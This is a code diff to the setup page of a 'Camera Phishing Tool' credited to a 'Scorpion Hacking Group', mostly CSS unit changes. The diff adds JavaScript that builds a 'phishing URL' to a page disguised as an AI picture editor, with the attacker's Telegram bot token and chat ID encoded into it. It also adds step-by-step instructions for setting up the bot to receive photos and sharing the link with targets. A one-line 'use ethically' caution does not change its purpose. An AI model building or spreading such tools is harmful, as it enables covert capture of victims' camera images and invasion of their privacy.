@@ -18,34 +18,39 @@
             min-height: 100vh;
             background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
             font-family: 'Arial', sans-serif;
-            padding: 20px;
+            padding: 1.25rem;
         }
         .setup-card {
             background: rgba(255, 255, 255, 0.15);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
+            backdrop-filter: blur(0.9375rem);
+            border-radius: 1.25rem;
             padding: 2rem;
             width: 100%;
-            max-width: 400px;
+            max-width: 25rem;
             text-align: center;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 0.625rem 2.5rem rgba(0, 0, 0, 0.3);
             transition: transform 0.3s ease;
         }
         .setup-card:hover {
-            transform: translateY(-10px);
+            transform: translateY(-0.625rem);
         }
         h1 {
             color: #fff;
             font-size: 2rem;
+            margin-bottom: 1rem;
+            text-shadow: 0 0.125rem 0.3125rem rgba(0, 0, 0, 0.2);
+        }
+        p.subtitle {
+            color: #f0f0f0;
+            font-size: 1.2rem;
             margin-bottom: 1.5rem;
-            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
         }
         input {
             width: 100%;
             padding: 0.8rem;
             margin: 0.8rem 0;
             border: none;
-            border-radius: 10px;
+            border-radius: 0.625rem;
             background: rgba(255, 255, 255, 0.2);
             color: #fff;
             font-size: 1rem;
@@ -59,12 +64,12 @@
             background: #ffcc00;
             border: none;
             padding: 0.8rem 1.5rem;
-            border-radius: 10px;
+            border-radius: 0.625rem;
             color: #333;
             font-size: 1rem;
             cursor: pointer;
             transition: background 0.3s ease, transform 0.2s ease;
-            margin-top: 1rem;
+            margin: 0.5rem 0;
         }
         .btn:hover {
             background: #e6b800;
@@ -74,10 +79,39 @@
             color: #f0f0f0;
             font-size: 0.9rem;
             word-break: break-all;
-            margin-top: 1.5rem;
+            margin-top: 1rem;
             padding: 0.8rem;
             background: rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
+            border-radius: 0.625rem;
+        }
+        .instructions {
+            display: none;
+            color: #f0f0f0;
+            font-size: 0.9rem;
+            text-align: left;
+            margin-top: 1rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 0.625rem;
+        }
+        .instructions h3 {
+            color: #fff;
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+        }
+        .instructions ul {
+            list-style-type: disc;
+            padding-left: 1.25rem;
+        }
+        .instructions li {
+            margin-bottom: 0.5rem;
+        }
+        .instructions a {
+            color: #ffcc00;
+            text-decoration: none;
+        }
+        .instructions a:hover {
+            color: #e6b800;
         }
         footer {
             position: fixed;
@@ -86,6 +120,7 @@
             font-size: 0.9rem;
             text-align: center;
             width: 100%;
+            text-shadow: 0 0.0625rem 0.125rem rgba(0, 0, 0, 0.2);
         }
         footer a {
             color: #ffcc00;
@@ -105,15 +140,15 @@
             0%, 100% { transform: scale(1); }
             50% { transform: scale(1.2); }
         }
-        @media (max-width: 600px) {
+        @media (max-width: 37.5rem) {
             .setup-card {
                 padding: 1.5rem;
             }
             h1 {
                 font-size: 1.8rem;
             }
-            input, .btn {
-                font-size: 0.9rem;
+            p.subtitle, input, .btn, .instructions {
+                font-size: 0.85rem;
             }
         }
     </style>
@@ -121,12 +156,23 @@
 <body>
     <div class="setup-card">
         <h1>Scorpion Hacking Group</h1>
-        <p>Camera Phishing Tool (Setup)</p>
+        <p class="subtitle">Camera Phishing Tool (Setup)</p>
         <input type="text" id="botToken" placeholder="Enter Telegram Bot Token">
         <input type="text" id="chatId" placeholder="Enter Telegram Chat ID">
         <button class="btn" onclick="generateUrl()">Generate Phishing URL</button>
         <div id="urlOutput"></div>
-        <div class="pulse"></div>
+        <button class="btn" onclick="toggleInstructions()">Show Instructions</button>
+        <div class="instructions" id="instructions">
+            <h3>How to Set Up Your Phishing Tool</h3>
+            <ul>
+                <li><strong>Get Bot Token:</strong> Open Telegram, message <a href="https://t.me/BotFather" target="_blank">@BotFather</a>, type <code>/newbot</code>, follow prompts to create a bot, and copy the token (e.g., <code>123456:ABC-DEF...</code>).</li>
+                <li><strong>Get Chat ID:</strong> Message <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a> to get your personal chat ID, or add your bot to a group/channel and use a tool like <a href="https://t.me/getidsbot" target="_blank">@getidsbot</a> to find the ID (e.g., <code>-1001234567890</code>).</li>
+                <li><strong>Activate Bot:</strong> Message your bot directly and send <code>/start</code> to activate it. This ensures the bot can receive photos.</li>
+                <li><strong>Generate URL:</strong> Enter the bot token and chat ID above, click "Generate Phishing URL", and copy the link. Share it to start the phishing tool.</li>
+                <li><strong>Caution:</strong> Use ethically for testing or awareness. Unauthorized use is illegal and may lead to bans or legal action.</li>
+            </ul>
+        </div>
+        <div class="pulse">⚡</div>
     </div>
     <footer>
         Developed By <a href="https://t.me/ScorpionYug" target="_blank">Scorpion Yug</a> & Zara
@@ -141,13 +187,18 @@
                 return;
             }
             try {
-                const encodedToken = btoa(botToken); // Base64 encode
+                const encodedToken = btoa(botToken);
                 const encodedChatId = btoa(chatId);
                 const phishingUrl = `https://scorpion-yug.netlify.app/ai-pic-editor.html?t=${encodedToken}&c=${encodedChatId}`;
-                urlOutput.innerHTML = `Your Phishing URL >>> <a href="${phishingUrl}" target="_blank">${phishingUrl}</a>`;
+                urlOutput.innerHTML = `Your Phishing URL: <a href="${phishingUrl}" target="_blank">${phishingUrl}</a>`;
             } catch (err) {
                 urlOutput.innerText = 'Error generating URL: Invalid input!';
             }
+        }
+
+        function toggleInstructions() {
+            const instructions = document.getElementById('instructions');
+            instructions.style.display = instructions.style.display === 'block' ? 'none' : 'block';
         }
     </script>
 </body>
